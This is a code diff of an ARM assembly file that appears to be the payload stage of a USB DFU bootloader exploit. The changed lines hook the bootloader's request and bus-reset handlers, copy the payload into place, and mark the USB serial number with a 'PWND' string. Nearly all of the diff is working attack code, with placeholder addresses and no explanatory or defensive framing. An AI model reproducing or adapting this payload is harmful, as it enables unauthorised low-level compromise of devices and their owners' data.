@@ -17,23 +17,26 @@
 
 .pool
 .set payload_dest,                        0x7FFFFF0
-.set dfu_handle_request,                  0x7FFFFF1
-.set payload_off,                         0x7FFFFF2
-.set payload_sz,                          0x7FFFFF3
-.set memcpy_addr,                         0x7FFFFF4
-.set gUSBSerialNumber,                    0x7FFFFF5
-.set usb_create_string_descriptor,        0x7FFFFF6
-.set usb_serial_number_string_descriptor, 0x7FFFFF7
-.set total_received,                      0x7FFFFF8
+.set dfu_handle_bus_reset,                0x7FFFFF1
+.set dfu_handle_request,                  0x7FFFFF2
+.set payload_off,                         0x7FFFFF3
+.set payload_sz,                          0x7FFFFF4
+.set memcpy_addr,                         0x7FFFFF5
+.set gUSBSerialNumber,                    0x7FFFFF6
+.set usb_create_string_descriptor,        0x7FFFFF7
+.set usb_serial_number_string_descriptor, 0x7FFFFF8
 
 .arm
 .global _main
 _main:
 	push {lr}
 	ldr r0, =payload_dest
-	ldr r3, =dfu_handle_request
+	ldr r2, =dfu_handle_bus_reset
+	mov r1, #0
+	str r1, [r2]
+	ldr r2, =dfu_handle_request
 	add r1, r0, #0x7
-	str r1, [r3]
+	str r1, [r2]
 	adr r1, _main
 	ldr r2, =payload_off
 	add r1, r1, r2
@@ -60,9 +63,6 @@ _find_zero_loop:
 	blx r1
 	ldr r1, =usb_serial_number_string_descriptor
 	strb r0, [r1]
-	mov r0, #0
-	ldr r1, =total_received
-	str r0, [r1]
 	pop {pc}
 
 PWND_STR:
